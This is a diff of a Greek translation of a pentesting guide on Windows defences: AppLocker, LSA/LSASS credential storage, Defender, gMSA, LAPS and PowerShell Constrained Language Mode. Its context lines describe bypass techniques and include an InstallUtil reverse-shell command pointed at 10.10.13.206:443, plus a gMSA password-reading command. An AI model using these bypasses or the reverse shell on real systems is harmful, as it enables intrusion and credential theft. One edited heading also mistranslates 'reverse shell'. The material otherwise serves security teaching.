@@ -27,7 +27,7 @@ Get Access Today:
 Μια λίστα λευκών εφαρμογών είναι μια λίστα εγκεκριμένων λογισμικών εφαρμογών ή εκτελέσιμων που επιτρέπεται να είναι παρόντα και να εκτελούνται σε ένα σύστημα. Ο στόχος είναι να προστατευθεί το περιβάλλον από κακόβουλο λογισμικό και μη εγκεκριμένο λογισμικό που δεν ευθυγραμμίζεται με τις συγκεκριμένες επιχειρηματικές ανάγκες ενός οργανισμού.
 
 [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) είναι η **λύση λευκής λίστας εφαρμογών** της Microsoft και δίνει στους διαχειριστές συστημάτων έλεγχο πάνω σε **ποια εφαρμογές και αρχεία μπορούν να εκτελούν οι χρήστες**. Παρέχει **λεπτομερή έλεγχο** πάνω σε εκτελέσιμα, σενάρια, αρχεία εγκατάστασης Windows, DLLs, πακέτα εφαρμογών και εγκαταστάτες πακέτων εφαρμογών.\
-Είναι κοινό για οργανισμούς να **μπλοκάρουν το cmd.exe και το PowerShell.exe** και την εγγραφή σε ορισμένους καταλόγους, **αλλά όλα αυτά μπορούν να παρακαμφθούν**.
+Είναι κοινό για τους οργανισμούς να **μπλοκάρουν το cmd.exe και το PowerShell.exe** και την εγγραφή σε ορισμένους καταλόγους, **αλλά όλα αυτά μπορούν να παρακαμφθούν**.
 
 ### Check
 
@@ -53,12 +53,12 @@ C:\Windows\System32\spool\drivers\color
 C:\Windows\Tasks
 C:\windows\tracing
 ```
-* Συνήθως **έμπιστοι** [**"LOLBAS's"**](https://lolbas-project.github.io/) δυαδικοί κώδικες μπορούν επίσης να είναι χρήσιμοι για να παρακαμφθεί το AppLocker.
+* Συχνά **έμπιστοι** [**"LOLBAS's"**](https://lolbas-project.github.io/) δυαδικοί κώδικες μπορούν επίσης να είναι χρήσιμοι για να παρακαμφθεί το AppLocker.
 * **Κακώς γραμμένοι κανόνες θα μπορούσαν επίσης να παρακαμφθούν**
 * Για παράδειγμα, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, μπορείτε να δημιουργήσετε έναν **φάκελο με όνομα `allowed`** οπουδήποτε και θα επιτραπεί.
 * Οι οργανισμοί συχνά επικεντρώνονται στο **να μπλοκάρουν το `%System32%\WindowsPowerShell\v1.0\powershell.exe` εκτελέσιμο**, αλλά ξεχνούν τις **άλλες** [**τοποθεσίες εκτελέσιμων PowerShell**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) όπως το `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ή το `PowerShell_ISE.exe`.
-* **Η επιβολή DLL σπάνια είναι ενεργοποιημένη** λόγω του επιπλέον φορτίου που μπορεί να επιφέρει σε ένα σύστημα, και της ποσότητας δοκιμών που απαιτούνται για να διασφαλιστεί ότι τίποτα δεν θα σπάσει. Έτσι, η χρήση **DLLs ως πίσω πόρτες θα βοηθήσει στην παράκαμψη του AppLocker**.
-* Μπορείτε να χρησιμοποιήσετε [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ή [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) για να **εκτελέσετε κώδικα Powershell** σε οποιαδήποτε διαδικασία και να παρακάμψετε το AppLocker. Για περισσότερες πληροφορίες, δείτε: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
+* **Η επιβολή DLL σπάνια ενεργοποιείται** λόγω του επιπλέον φορτίου που μπορεί να επιφέρει σε ένα σύστημα, και της ποσότητας δοκιμών που απαιτούνται για να διασφαλιστεί ότι τίποτα δεν θα σπάσει. Έτσι, η χρήση **DLLs ως πίσω πόρτες θα βοηθήσει στην παράκαμψη του AppLocker**.
+* Μπορείτε να χρησιμοποιήσετε [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ή [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) για να **εκτελέσετε κώδικα Powershell** σε οποιαδήποτε διαδικασία και να παρακάμψετε το AppLocker. Για περισσότερες πληροφορίες, ελέγξτε: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
 
 ## Αποθήκευση Διαπιστευτηρίων
 
@@ -70,13 +70,13 @@ C:\windows\tracing
 
 Τα **διαπιστευτήρια** (κατακερματισμένα) είναι **αποθηκευμένα** στη **μνήμη** αυτού του υποσυστήματος για λόγους Ενιαίας Σύνδεσης.\
 Η **LSA** διαχειρίζεται την τοπική **πολιτική ασφαλείας** (πολιτική κωδικών πρόσβασης, δικαιώματα χρηστών...), **αυθεντικοποίηση**, **tokens πρόσβασης**...\
-Η LSA θα είναι αυτή που θα **ελέγξει** τα παρεχόμενα διαπιστευτήρια μέσα στο **SAM** αρχείο (για τοπική σύνδεση) και θα **μιλήσει** με τον **ελεγκτή τομέα** για να αυθεντικοποιήσει έναν χρήστη τομέα.
+Η LSA θα είναι αυτή που θα **ελέγξει** τα παρεχόμενα διαπιστευτήρια μέσα στο **αρχείο SAM** (για τοπική σύνδεση) και θα **μιλήσει** με τον **ελεγκτή τομέα** για να αυθεντικοποιήσει έναν χρήστη τομέα.
 
 Τα **διαπιστευτήρια** είναι **αποθηκευμένα** μέσα στη **διαδικασία LSASS**: εισιτήρια Kerberos, κατακερματισμοί NT και LM, εύκολα αποκρυπτογραφημένοι κωδικοί πρόσβασης.
 
 ### Μυστικά LSA
 
-Η LSA θα μπορούσε να αποθηκεύσει σε δίσκο κάποια διαπιστευτήρια:
+Η LSA θα μπορούσε να αποθηκεύσει στο δίσκο κάποια διαπιστευτήρια:
 
 * Κωδικός πρόσβασης του λογαριασμού υπολογιστή του Active Directory (μη προσβάσιμος ελεγκτής τομέα).
 * Κωδικοί πρόσβασης των λογαριασμών υπηρεσιών Windows
@@ -89,7 +89,7 @@ C:\windows\tracing
 
 ## Defender
 
-[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) είναι ένα Antivirus που είναι διαθέσιμο στα Windows 10 και Windows 11, και σε εκδόσεις Windows Server. **Μπλοκάρει** κοινά εργαλεία pentesting όπως το **`WinPEAS`**. Ωστόσο, υπάρχουν τρόποι για να **παρακαμφθούν αυτές οι προστασίες**.
+[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) είναι ένα Antivirus που είναι διαθέσιμο στα Windows 10 και Windows 11, και σε εκδόσεις του Windows Server. **Μπλοκάρει** κοινά εργαλεία pentesting όπως το **`WinPEAS`**. Ωστόσο, υπάρχουν τρόποι για να **παρακαμφθούν αυτές οι προστασίες**.
 
 ### Έλεγχος
 
@@ -164,9 +164,9 @@ Microsoft developed **Group Managed Service Accounts (gMSA)** to simplify the ma
 * **Ενισχυμένη Ασφάλεια**: Αυτοί οι λογαριασμοί είναι ανθεκτικοί σε κλειδώματα και δεν μπορούν να χρησιμοποιηθούν για διαδραστικές συνδέσεις, ενισχύοντας την ασφάλειά τους.
 * **Υποστήριξη Πολλών Υπολογιστών**: gMSAs μπορούν να μοιράζονται σε πολλούς υπολογιστές, καθιστώντας τους ιδανικούς για υπηρεσίες που εκτελούνται σε πολλούς διακομιστές.
 * **Δυνατότητα Προγραμματισμένων Εργασιών**: Σε αντίθεση με τους διαχειριζόμενους λογαριασμούς υπηρεσιών, οι gMSAs υποστηρίζουν την εκτέλεση προγραμματισμένων εργασιών.
-* **Απλοποιημένη Διαχείριση SPN**: Το σύστημα ενημερώνει αυτόματα το Service Principal Name (SPN) όταν υπάρχουν αλλαγές στα στοιχεία sAMaccount του υπολογιστή ή στο DNS όνομα, απλοποιώντας τη διαχείριση SPN.
+* **Απλοποιημένη Διαχείριση SPN**: Το σύστημα ενημερώνει αυτόματα το Όνομα Υπηρεσίας (SPN) όταν υπάρχουν αλλαγές στα στοιχεία sAMaccount του υπολογιστή ή στο όνομα DNS, απλοποιώντας τη διαχείριση SPN.
 
-Οι κωδικοί πρόσβασης για gMSAs αποθηκεύονται στην ιδιότητα LDAP _**msDS-ManagedPassword**_ και επαναρυθμίζονται αυτόματα κάθε 30 ημέρες από τους Domain Controllers (DCs). Αυτός ο κωδικός πρόσβασης, ένα κρυπτογραφημένο blob δεδομένων γνωστό ως [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), μπορεί να ανακτηθεί μόνο από εξουσιοδοτημένους διαχειριστές και τους διακομιστές στους οποίους είναι εγκατεστημένα τα gMSAs, εξασφαλίζοντας ένα ασφαλές περιβάλλον. Για να αποκτήσετε πρόσβαση σε αυτές τις πληροφορίες, απαιτείται μια ασφαλής σύνδεση όπως το LDAPS ή η σύνδεση πρέπει να είναι πιστοποιημένη με 'Sealing & Secure'.
+Οι κωδικοί πρόσβασης για gMSAs αποθηκεύονται στην ιδιότητα LDAP _**msDS-ManagedPassword**_ και επαναρυθμίζονται αυτόματα κάθε 30 ημέρες από τους Ελεγκτές Τομέα (DCs). Αυτός ο κωδικός πρόσβασης, ένα κρυπτογραφημένο blob δεδομένων γνωστό ως [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), μπορεί να ανακτηθεί μόνο από εξουσιοδοτημένους διαχειριστές και τους διακομιστές στους οποίους είναι εγκατεστημένα τα gMSAs, εξασφαλίζοντας ένα ασφαλές περιβάλλον. Για να αποκτήσετε πρόσβαση σε αυτές τις πληροφορίες, απαιτείται μια ασφαλής σύνδεση όπως το LDAPS ή η σύνδεση πρέπει να είναι πιστοποιημένη με 'Sealing & Secure'.
 
 ![https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)
 
@@ -174,13 +174,13 @@ You can read this password with [**GMSAPasswordReader**](https://github.com/rvaz
 ```
 /GMSAPasswordReader --AccountName jkohler
 ```
-[**Βρείτε περισσότερες πληροφορίες σε αυτή την ανάρτηση**](https://cube0x0.github.io/Relaying-for-gMSA/)
+[**Βρείτε περισσότερες πληροφορίες σε αυτήν την ανάρτηση**](https://cube0x0.github.io/Relaying-for-gMSA/)
 
-Επίσης, ελέγξτε αυτή τη [σελίδα](https://cube0x0.github.io/Relaying-for-gMSA/) σχετικά με το πώς να εκτελέσετε μια **επίθεση NTLM relay** για να **διαβάσετε** τον **κωδικό πρόσβασης** του **gMSA**.
+Επίσης, ελέγξτε αυτήν τη [σελίδα](https://cube0x0.github.io/Relaying-for-gMSA/) σχετικά με το πώς να εκτελέσετε μια **επίθεση NTLM relay** για να **διαβάσετε** τον **κωδικό πρόσβασης** του **gMSA**.
 
 ## LAPS
 
-Η **Λύση Κωδικού Πρόσβασης Τοπικού Διαχειριστή (LAPS)**, διαθέσιμη για λήψη από [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), επιτρέπει τη διαχείριση των κωδικών πρόσβασης τοπικών διαχειριστών. Αυτοί οι κωδικοί πρόσβασης, οι οποίοι είναι **τυχαίοι**, μοναδικοί και **τακτικά αλλάζουν**, αποθηκεύονται κεντρικά στο Active Directory. Η πρόσβαση σε αυτούς τους κωδικούς πρόσβασης περιορίζεται μέσω ACLs σε εξουσιοδοτημένους χρήστες. Με επαρκείς άδειες, παρέχεται η δυνατότητα ανάγνωσης των κωδικών πρόσβασης τοπικών διαχειριστών.
+Η **Λύση Κωδικού Πρόσβασης Τοπικού Διαχειριστή (LAPS)**, διαθέσιμη για λήψη από την [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), επιτρέπει τη διαχείριση των κωδικών πρόσβασης τοπικών διαχειριστών. Αυτοί οι κωδικοί πρόσβασης, οι οποίοι είναι **τυχαίοι**, μοναδικοί και **τακτικά αλλάζουν**, αποθηκεύονται κεντρικά στο Active Directory. Η πρόσβαση σε αυτούς τους κωδικούς πρόσβασης περιορίζεται μέσω ACLs σε εξουσιοδοτημένους χρήστες. Με επαρκείς άδειες, παρέχεται η δυνατότητα ανάγνωσης των κωδικών πρόσβασης τοπικών διαχειριστών.
 
 {% content-ref url="active-directory-methodology/laps.md" %}
 [laps.md](active-directory-methodology/laps.md)
@@ -188,7 +188,7 @@ You can read this password with [**GMSAPasswordReader**](https://github.com/rvaz
 
 ## PS Constrained Language Mode
 
-Το PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **κλειδώνει πολλές από τις δυνατότητες** που απαιτούνται για τη χρήση του PowerShell αποτελεσματικά, όπως το μπλοκάρισμα COM αντικειμένων, επιτρέποντας μόνο εγκεκριμένους τύπους .NET, ροές εργασίας βασισμένες σε XAML, κλάσεις PowerShell και άλλα.
+Το PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **περιορίζει πολλές από τις δυνατότητες** που απαιτούνται για τη χρήση του PowerShell αποτελεσματικά, όπως το μπλοκάρισμα COM αντικειμένων, επιτρέποντας μόνο εγκεκριμένους τύπους .NET, ροές εργασίας βασισμένες σε XAML, κλάσεις PowerShell και άλλα.
 
 ### **Έλεγχος**
 ```powershell
@@ -207,7 +207,7 @@ Powershell -version 2
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
 ```
-#### Αντίστροφη κέλυφος:
+#### Αντίστροφη θήκη:
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
@@ -241,7 +241,7 @@ More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershel
 
 Είναι το API που μπορεί να χρησιμοποιηθεί για την αυθεντικοποίηση χρηστών.
 
-Το SSPI θα είναι υπεύθυνο για την εύρεση του κατάλληλου πρωτοκόλλου για δύο μηχανές που θέλουν να επικοινωνήσουν. Η προτιμώμενη μέθοδος γι' αυτό είναι το Kerberos. Στη συνέχεια, το SSPI θα διαπραγματευτεί ποιο πρωτόκολλο αυθεντικοποίησης θα χρησιμοποιηθεί, αυτά τα πρωτόκολλα αυθεντικοποίησης ονομάζονται Security Support Provider (SSP), βρίσκονται μέσα σε κάθε μηχανή Windows με τη μορφή DLL και και οι δύο μηχανές πρέπει να υποστηρίζουν το ίδιο για να μπορέσουν να επικοινωνήσουν.
+Η SSPI θα είναι υπεύθυνη για την εύρεση του κατάλληλου πρωτοκόλλου για δύο μηχανές που θέλουν να επικοινωνήσουν. Η προτιμώμενη μέθοδος γι' αυτό είναι το Kerberos. Στη συνέχεια, η SSPI θα διαπραγματευτεί ποιο πρωτόκολλο αυθεντικοποίησης θα χρησιμοποιηθεί, αυτά τα πρωτόκολλα αυθεντικοποίησης ονομάζονται Security Support Provider (SSP), βρίσκονται μέσα σε κάθε μηχανή Windows με τη μορφή DLL και και οι δύο μηχανές πρέπει να υποστηρίζουν το ίδιο για να μπορέσουν να επικοινωνήσουν.
 
 ### Main SSPs
 
@@ -249,14 +249,14 @@ More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershel
 * %windir%\Windows\System32\kerberos.dll
 * **NTLMv1** και **NTLMv2**: Λόγοι συμβατότητας
 * %windir%\Windows\System32\msv1\_0.dll
-* **Digest**: Διακομιστές ιστού και LDAP, κωδικός πρόσβασης με τη μορφή MD5 hash
+* **Digest**: Web servers και LDAP, κωδικός πρόσβασης με τη μορφή MD5 hash
 * %windir%\Windows\System32\Wdigest.dll
 * **Schannel**: SSL και TLS
 * %windir%\Windows\System32\Schannel.dll
-* **Negotiate**: Χρησιμοποιείται για να διαπραγματευτεί το πρωτόκολλο που θα χρησιμοποιηθεί (Kerberos ή NTLM με το Kerberos να είναι το προεπιλεγμένο)
+* **Negotiate**: Χρησιμοποιείται για να διαπραγματευτεί το πρωτόκολλο που θα χρησιμοποιηθεί (Kerberos ή NTLM, με το Kerberos να είναι το προεπιλεγμένο)
 * %windir%\Windows\System32\lsasrv.dll
 
-#### Η διαπραγμάτευση μπορεί να προσφέρει πολλές μεθόδους ή μόνο μία.
+#### Η διαπραγμάτευση θα μπορούσε να προσφέρει πολλές μεθόδους ή μόνο μία.
 
 ## UAC - User Account Control
 
